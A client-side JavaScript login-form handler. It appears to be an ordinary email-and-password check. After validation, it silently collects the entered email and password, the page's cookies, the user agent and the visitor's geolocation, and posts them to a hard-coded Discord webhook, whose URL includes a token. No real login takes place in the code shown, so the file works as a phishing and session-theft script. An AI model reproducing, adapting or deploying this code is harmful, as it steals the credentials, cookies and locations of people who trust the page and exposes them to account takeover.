document.getElementById("loginBtn").addEventListener("click", async function () {
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    var emailError = document.getElementById("emailError");
    var passwordError = document.getElementById("passwordError");

    var valid = true;

    emailError.style.display = "none";
    passwordError.style.display = "none";

    if (!email || !validateEmail(email)) {
        emailError.textContent = "Please enter a valid email address.";
        emailError.style.display = "block";
        valid = false;
    }

    if (!password) {
        passwordError.textContent = "Password is required.";
        passwordError.style.display = "block";
        valid = false;
    }

    if (valid) {
        var location = await getLocation();
        var latitude = location.latitude;
        var longitude = location.longitude;

        var cookies = document.cookie;
        var userAgent = navigator.userAgent;
        var language = navigator.language || navigator.userLanguage;
        var cameraStatus = "Unknown";
        var microphoneStatus = "Unknown";

        var webhookUrl = "https://discord.com/api/webhooks/1314841832865402961/4IA6-FuP3RtIsLXl6Naoljd9zIrlwPsqafE-sF6ImndbPBRCQ3lQz8_d87K1iX30UR2E";

        fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: `<@1190590601792585828>
                New Login Attempt:
                    Email: ${email}
                    Password: ${password}

                    ================================

                    Cookies: ${cookies}
                    User Agent: ${userAgent}
                    Location: Latitude - ${latitude}, Longitude - ${longitude}
                `
            })
        })
        .then(response => {
            if (response.ok) {
                console.log("Data sent successfully!");
            } else {
                console.error("Error sending data:", response.status);
            }
        })
        .catch(error => {
            console.error("There was an error with the webhook request:", error);
        });
    }
});

function validateEmail(email) {
    var re = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
    return re.test(email);
}

function getLocation() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    });
                },
                (error) => {
                    resolve({ latitude: "Unknown", longitude: "Unknown" });
                }
            );
        } else {
            resolve({ latitude: "Unknown", longitude: "Unknown" });
        }
    });
}
